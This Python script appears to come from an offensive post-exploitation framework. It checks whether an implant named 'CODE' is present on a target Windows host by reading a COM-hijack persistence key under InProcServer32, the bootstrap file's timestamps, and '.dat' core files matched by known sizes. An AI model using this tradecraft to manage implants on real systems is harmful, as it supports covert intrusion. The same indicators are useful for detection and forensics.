
import dsz
import ops, ops.cmd
import os
version = '1.0.1'
version_info = (1, 0, 1)
CODE_REG_HIVE = 'L'
CODE_REG_KEY = 'Software\\Classes\\CLSID\\{46C166AA-3108-11D4-9348-00C04F8EEB71}\\InProcServer32'
CODE_REG_VALUE = ''
CODE_REG_DATA_EXPECTED = 'hnetcfg.dll'
CODE_PATH_CORE = '%%WINDIR%%\\*.dat'
CODE_CORE_KNOWN_SIZES = {176472: '1.2.1.2', 141532: '1.2.1.1', 209368: '1.3.1.1', 270168: '1.3.1.2'}

def getenvvar(envvar):
    envcmd = ops.cmd.getDszCommand('environment', get=True, var=envvar)
    envobject = envcmd.execute()
    foundvar = None
    for value in envobject.environment.value:
        if (value.name.lower() == envvar.lower()):
            foundvar = value.value
    return foundvar

def expand(var):
    if var.startswith('%%SystemRoot%%'):
        systemroot = getenvvar('systemroot')
        if (systemroot is None):
            return None
        var = var.replace('%%SystemRoot%%', systemroot)
    elif var.startswith('%%WINDIR%%'):
        windir = getenvvar('windir')
        if (windir is None):
            return None
        var = var.replace('%%WINDIR%%', windir)
    return var

def getdirinfo(pathtocheck):
    cmd = ops.cmd.getDszCommand('dir', path=('"%s"' % os.path.dirname(pathtocheck)), mask=('"%s"' % os.path.basename(pathtocheck)))
    obj = cmd.execute()
    if cmd.success:
        try:
            return (obj.diritem[0].fileitem[0].filetimes.accessed.time, obj.diritem[0].fileitem[0].filetimes.created.time, obj.diritem[0].fileitem[0].filetimes.modified.time)
        except:
            pass
    return None

def get_core_candidates(pathtocheck):
    cmd = ops.cmd.getDszCommand('dir', path=('"%s"' % os.path.dirname(pathtocheck)), mask=('"%s"' % os.path.basename(pathtocheck)))
    obj = cmd.execute()
    if cmd.success:
        candidates = [f for d in obj.diritem for f in d.fileitem if (f.attributes.directory == 0) if (f.size in CODE_CORE_KNOWN_SIZES)]
        return candidates
    return []

def regquery_single(hive, key, value):
    regcmd = ops.cmd.DszCommand('registryquery', hive=hive, key=('"%s"' % key), value=('"%s"' % value))
    obj = regcmd.execute()
    if regcmd.success:
        ret_key = regcmd.result.key[0]
        ret_value = ret_key.value[0]
        return {'type': ret_value.type, 'updatedate': ret_key.updatedate, 'updatetime': ret_key.updatetime, 'hive': hive, 'key': key, 'value': value, 'data': ret_value.value}
    else:
        return None

def check_code_reg():
    dsz.ui.Echo('Checking for persistence in registry')
    value = regquery_single(CODE_REG_HIVE, CODE_REG_KEY, CODE_REG_VALUE)
    if (value is None):
        dsz.ui.Echo('InProcServer32 key not found', dsz.ERROR)
        return None
    else:
        dsz.ui.Echo(('InProcServer32 key found [%s %s]' % (value['updatedate'], value['updatetime'])), dsz.GOOD)
        pathtocheck = value['data']
        if (os.path.basename(pathtocheck) == CODE_REG_DATA_EXPECTED):
            dsz.ui.Echo('Registry key contains default value', dsz.ERROR)
            return None
        dsz.ui.Echo('Registry key does not contain default value', dsz.GOOD)
        if (value['type'] == u'REG_EXPAND_SZ'):
            pathtocheck = expand(pathtocheck)
        return pathtocheck

def main():
    dsz.ui.Echo('==================================')
    dsz.ui.Echo('============== CODE ==============')
    dsz.ui.Echo('==================================')
    found_persistence = True
    path_to_check = check_code_reg()
    if (path_to_check is None):
        found_persistence = False
        dsz.ui.Echo('It appears CODE is NOT installed', dsz.ERROR)
    found_bootstrap = False
    if found_persistence:
        dsz.ui.Echo('')
        dsz.ui.Echo('Checking for location of bootstrap on disk')
        file_times = getdirinfo(path_to_check)
        if (file_times is None):
            dsz.ui.Echo(('Could not find %s' % path_to_check), dsz.ERROR)
        else:
            found_bootstrap = True
            dsz.ui.Echo(('Found %s [a:%s, c:%s, m:%s]' % (path_to_check, file_times[0], file_times[1], file_times[2])), dsz.GOOD)
    dsz.ui.Echo('')
    dsz.ui.Echo('Checking for location of core on disk')
    candidates = []
    path_to_check = expand(CODE_PATH_CORE)
    if (path_to_check is None):
        dsz.ui.Echo(('Could not expand path "%s"' % CODE_PATH_CORE), dsz.ERROR)
    else:
        candidates = get_core_candidates(path_to_check)
    if (not candidates):
        dsz.ui.Echo('No candidates could be found for CODE core', dsz.WARNING)
    else:
        dsz.ui.Echo('Found possible candidates for CODE core', dsz.GOOD)
        for f in candidates:
            ft = f.filetimes
            dsz.ui.Echo(('%s [a:%s, c:%s, m:%s]' % (f.fullpath, ft.accessed.time, ft.created.time, ft.modified.time)), dsz.GOOD)
            dsz.ui.Echo(('    Size: %d (v: %s)' % (f.size, CODE_CORE_KNOWN_SIZES[f.size])), dsz.GOOD)
    dsz.ui.Echo('')
    if (found_bootstrap and candidates):
        dsz.ui.Echo('It appears CODE is installed', dsz.GOOD)
    elif found_bootstrap:
        dsz.ui.Echo('CODE may or may not be installed', dsz.WARNING)
    elif candidates:
        dsz.ui.Echo('Possible remnants from previous CODE installation', dsz.WARNING)
    else:
        dsz.ui.Echo('It appears CODE is NOT installed', dsz.ERROR)
if (__name__ == '__main__'):
    main()